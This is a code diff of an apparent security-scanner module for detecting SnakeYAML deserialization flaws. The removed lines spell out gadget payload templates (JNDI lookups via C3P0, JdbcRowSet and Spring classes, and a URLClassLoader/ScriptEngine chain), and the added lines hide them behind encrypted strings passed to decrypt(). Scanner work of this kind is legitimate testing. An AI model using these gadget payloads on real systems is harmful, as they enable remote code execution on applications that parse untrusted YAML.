@@ -22,38 +22,38 @@ import java.util.regex.Pattern;
  **********************************************************/
 public class SnakeYAMLModule extends FreddyModuleBase {
     //C3P0RefDataSource payload data
-    private static final String C3P0REF_PREFIX = "!!com.mchange.v2.c3p0.JndiRefForwardingDataSource\n  jndiName: \"";
-    private static final String C3P0REF_SUFFIX = "\"\n  loginTimeout: 0\n";
+    private final String C3P0REF_PREFIX = decrypt("tr6wQuzWjwSMw6kjW+vPCY1+UaDYgnZgJPhbblAaJHCifYJYQMcssbxDhzLByO6JbUANylbsl7ybK8bdAXywhQ==");
+    private final String C3P0REF_SUFFIX = decrypt("PVAS6TS/5TBfpVpGGjJTkAZqhiCWjRIAbePppjSLDAw=");
 
     //CommonsConfiguration payload data
-    private static final String CC_PREFIX = "set:\n  ? !!org.apache.commons.configuration.ConfigurationMap [!!org.apache.commons.configuration.JNDIConfiguration [!!javax.naming.InitialContext [], \"";
-    private static final String CC_SUFFIX = "\"]]\n";
+    private final String CC_PREFIX = decrypt("+LIZ5K0t7Pk4K4TsfE2MNmNfYeglVVSFa1GkJwxQXHsMahAvKKfqrWz/9+4DmD0u1/yVL+Rm80rzN628rmO7c9aiBwB4O8r8HCNHWHhfpvGz7TX1CM/pZaMuz0LLXrSuiWQG75PM7c/D7XKBRIJULMuuoAwHIiaEUxRh/LEiiSqFJow2zffokiPcm0QOdQewt+X38mx7/Ch2WiKn2ASrxA==");
+    private final String CC_SUFFIX = decrypt("Y4kNn3UtdvZhss52oB8yog==");
 
     //JdbcRowSet payload data
-    private static final String JDBC_PREFIX = "!!com.sun.rowset.JdbcRowSetImpl\n  dataSourceName: \"";
-    private static final String JDBC_SUFFIX = "\"\n  autoCommit: true\n";
+    private final String JDBC_PREFIX = decrypt("atVodCMpjaH/tI9J6UaQqma196+Ek5phf34Ypz0O+XqhSRSB9EIF15yjvPu63tDVpDMfqn/ZIS0gHuEpcQIOSg==");
+    private final String JDBC_SUFFIX = decrypt("PSBgh3i/81Trr82RmEftudpN7s7z6DOokyI2iPa91uU=");
 
     //ResourceGadget payload data
-    private static final String RG_PREFIX = "[!!org.eclipse.jetty.plus.jndi.Resource [\"__/obj\", !!javax.naming.Reference [\"foo\", \"Freddy\", \"";
-    private static final String RG_SUFFIX = "\"]], !!org.eclipse.jetty.plus.jndi.Resource [\"obj/test\", !!java.lang.Object []]]\n";
+    private final String RG_PREFIX = decrypt("ZyhrHFZuW5B8y61ow0r0wjM98dyV2lIDSTQcm4Y/rq3a4IzfxnJ0APfji7ksL+qUP0ZptUyoOlhK1Ci7os7eCFj7+GbQXIG82FFJO5fFGFhzwcMpM2y5DCH6kSfr4JOx");
+    private final String RG_SUFFIX = decrypt("O5t6JAIbTtRbeYDkiZVj2y83gb//0O0XMxbRHAWYYH5Acy0zYZp++PD0oJntM9M+D0lNgs7FseNCQVOZjbxo/OkIUBPW59bP261zdSax1pzK9V5uXvzAcmq6jUFkFEbI");
 
     //ScriptEngine payload data
-    private static final String SE_PREFIX = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"";
-    private static final String SE_SUFFIX = "\"]]]]\n";
+    private final String SE_PREFIX = decrypt("pK4NP3liInk+q5UTeHFPTcPbJ475uz4Iy7MQ2lXjljKQLHdbMPeLSsPQYBwMI57tlmLLvu2YDodFPiG1Dde0Y2HvFHBotHl/KDPAX2KQpUmtvq80Vv/06d2+G1ZJBk1N");
+    private final String SE_SUFFIX = decrypt("JfU+vW/TQgxSFMEDJ9f0oA==");
 
     //SpringAbstractBeanFactory payload data
-    private static final String SABF_PREFIX = "set:\n  ? !!org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor\n    adviceBeanName: \"";
-    private static final String SABF_MIDDLE = "\"\n    beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory\n      shareableResources: [\"";
-    private static final String SABF_SUFFIX = "\"]\n  ? !!org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor []\n";
+    private final String SABF_PREFIX = decrypt("mLfP6DGgDZ9M4PNGwD/x6JMkwz7qTjQJqxWVN6GIpMXPW7el8kwL/57a6AvEXfUbHywGisuhiqJVxN0OXiqCOHbgCcTjPDF/GMNzrzSjcVOmXe/0xUbXe5jb1wDEOTuUFOHNDjv4LZAr9mOW6bMu2g==");
+    private final String SABF_MIDDLE = decrypt("KiDBqQDnBVeJeYCcd5lEBOECK+YsHp67m7N1PmjO84sybATdae6mit74KZ/pLnghf+kYA5Bi2DF8wFtOQp3Pm8gx/MFc4PBBuKXjiAIhplqM4tylBwc3DPBPzaeCuLRrrX6sNITiNAXE0S0d+rG3eg==");
+    private final String SABF_SUFFIX = decrypt("9pDXcQIZxaRxOJhpNDmBa5b8naShFSVgMl8QNEBw4eqebUjdgN9u2b6ZFQs/jPI/BfOG8R4RaPNjFYYjGEA3hqaSDHXCJzxmvHr5VCrhXHY=");
 
     //SpringPropertyPathFactory payload data
-    private static final String SPPF_PREFIX = "!!org.springframework.beans.factory.config.PropertyPathFactoryBean\n  targetBeanName: \"";
-    private static final String SPPF_MIDDLE = "\"\n  propertyPath: foo\n  beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory\n    shareableResources: [\"";
-    private static final String SPPF_SUFFIX = "\"]\n";
+    private final String SPPF_PREFIX = decrypt("umx6pgbpVKiuYlfK8y58prOrrLH3wOomN2tj0R8yxXnDIdo8+k6UReTWgEskH921wErdtrJdl2f+g1Cg0mCBq5okxZLN61/CqldJWfPN83c1bZQS8C8Yex6L2ERa6eGm");
+    private final String SPPF_MIDDLE = decrypt("v8Rod35reAvZ5m+wWdZZ2DJGBtVPN6XaXmf51BGC1eeuj/FWgi100riQdJvSKf7wPOjQ4jTTlgJTXIOwnQqaRswdrlaGZJGYs+zReXelfQCv/ka6uMEB/fp0I+2fJykgjOLcpQcHNwzwT82ngri0a61+rDSE4jQFxNEtHfqxt3o=");
+    private final String SPPF_SUFFIX = decrypt("xPotKoJ+yNDtUL7SPupSkQ==");
 
     //XBean payload data
-    private static final String XBEAN_PREFIX = "!!javax.management.BadAttributeValueExpException [!!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding [\"foo\", !!javax.naming.Reference [foo, \"Freddy\", \"";
-    private static final String XBEAN_SUFFIX = "\"], !!org.apache.xbean.naming.context.WritableContext []]]\n";
+    private final String XBEAN_PREFIX = decrypt("/EBquv1Ssr1fAcBZrrRZw/Mw0kBpmC8L+LvPlTzBVqPq/DbUt038MwiGDj6Dj4qiTq5z7Tc66ZMni/mUUEbZQ9rBOZ+9xGlQY+NIQOmwkZYYVqv2y5/lZSthQzn7wW10bFi76n0IO618weKnFb4BP1To5i1s5qOJBW9OSHbgOnvmkJtuBnkvuCoyiiq9jVVv1DnlQiMvEbJ9sedxJ5cHZBThzQ47+C2QK/ZjlumzLto=");
+    private final String XBEAN_SUFFIX = decrypt("olyPP0uUeevi9N6GFY89BSFiZmA3h5Q9QqKiRwzLBnad7KmZ6/zqbX7NMoOHCapBUIMdAsTNLJ6Ez36aazVivQ==");
 
     protected void initialiseModule() {
         setName("SnakeYAML");
